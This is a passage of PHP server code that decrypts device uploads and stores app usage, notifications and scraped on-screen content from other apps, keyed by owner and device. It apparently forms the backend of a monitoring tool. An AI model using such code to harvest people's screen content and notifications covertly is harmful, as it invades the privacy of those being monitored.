     * parse_apps_notifications - Composite splitter for AppsAndNotificationsComposite
     * Splits the composite JSON into app_usage and notifications sub-parsers
     */
    public function parse_apps_notifications(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $json = $this->payloadToArray($file_name, $file_name);
            if ($json === null) {
                log_message('error', '[parse_apps_notifications] Failed to load payload: ' . $file_name);
                return false;
            }

            $allData = $json['data'] ?? $json;
            $extractedAt = $json['timestamp'] ?? time() * 1000;

            // Route app_usage sub-data
            if (isset($allData['app_usage']) && is_array($allData['app_usage'])) {
                $this->parse_app_usage(array_merge([
                    'timestamp' => $extractedAt,
                    'extracted_at' => $extractedAt,
                ], $allData['app_usage']), $owner_id, $device_id, $fileRecordId);
            }

            // Route notifications sub-data
            if (isset($allData['notifications']) && is_array($allData['notifications'])) {
                $this->parse_notifications(array_merge([
                    'timestamp' => $extractedAt,
                    'extracted_at' => $extractedAt,
                ], $allData['notifications']), $owner_id, $device_id, $fileRecordId);
            }

            log_message('info', '[parse_apps_notifications] Completed composite split for ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_apps_notifications] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Parse scraped UI elements log and insert into tbl_extracted_ui_scrapes.
     * File prefix: UI scraper data under composite 'misc_software'
     */
    public function parse_ui_scrape(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? $json['timestamp'] ?? null;
            $scrapeList = $json['scraped_ui_entries'] ?? $json['scrape_log'] ?? $json['scrapes'] ?? [];
            if (!is_array($scrapeList)) {
                // If it's a single scrape log item, wrap in array
                if (isset($json['package_name'])) {
                    $scrapeList = [$json];
                } else {
                    return false;
                }
            }

            $batch = [];
            foreach ($scrapeList as $item) {
                $pkg = $item['package_name'] ?? null;
                $timestamp = $item['event_timestamp'] ?? $item['timestamp'] ?? null;
                if (!$pkg || !$timestamp) continue;

                $exists = $this->db->table('tbl_extracted_ui_scrapes')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('package_name', $pkg)
                    ->where('event_timestamp', $timestamp)
                    ->countAllResults() > 0;
                if ($exists) continue;

                $batch[] = [
                    'owner_id' => $owner_id,
                    'device_id' => $device_id,
                    'package_name' => $pkg,
                    'event_type' => $item['event_type'] ?? null,
                    'is_app_launch' => isset($item['is_app_launch']) ? ($item['is_app_launch'] ? 1 : 0) : 0,
                    'activity_class' => $item['activity_class'] ?? null,
                    'scraped_content' => is_array($item['scraped_content'] ?? null) ? json_encode($item['scraped_content']) : ($item['scraped_content'] ?? null),
                    'event_timestamp' => $timestamp,
                    'created_at' => $dated,
                    'updated_at' => $dated,
                ];
            }

            if (!empty($batch)) {
                $this->db->table('tbl_extracted_ui_scrapes')->insertBatch($batch);
            }

            log_message('info', '[parse_ui_scrape] Inserted ' . count($batch) . ' scraped UI elements from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_ui_scrape] Exception: ' . $e->getMessage());
            return false;
        }
    }

private function decryptIfEncrypted(string $content): ?string
{
    if (strlen($content) > 100 && preg_match('/^[A-Za-z0-9+\/=]+$/', $content)) {
        try {
            $dataProcessor = new \App\Libraries\DataProcessingService();
            return $dataProcessor->decryptData($content);
        } catch (Exception $e) {
        }
    }
    return $content;
}

    /**
     * Normalize a parser payload into a decoded associative array.
     *
     * Composite dispatchers (parse_misc_software / parse_misc_hardware /
     * parse_apps_notifications) pass the already-decoded sub-data array directly,
     * avoiding the file round-trip. The queue path still passes an encrypted
     * filename string, which is read and decrypted here.
     *
     * @param string|array $payload    Decoded sub-data array OR an encrypted file name
     * @param string       $file_name  Original file name (used for logging/read path)
     * @return array|null  Decoded data, or null on failure
     */
    protected function payloadToArray(string|array $payload, string $file_name): ?array
    {
        if (is_array($payload)) {
            return $payload;
        }

        $cryptModel = new Mod_Crypt();
        $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
        if ($raw === false) {
            log_message('error', '[payloadToArray] Cannot read file: ' . $file_name);
            return null;
        }

        $decoded = $cryptModel->decode_content($raw);
        if ($decoded === false) {
            log_message('error', '[payloadToArray] Decryption failed: ' . $file_name);
            return null;
        }

        $json = json_decode($decoded, true);
        if ($json === null) {
            log_message('error', '[payloadToArray] JSON decode failed: ' . $file_name);
            return null;
        }

        return $json;
    }
}
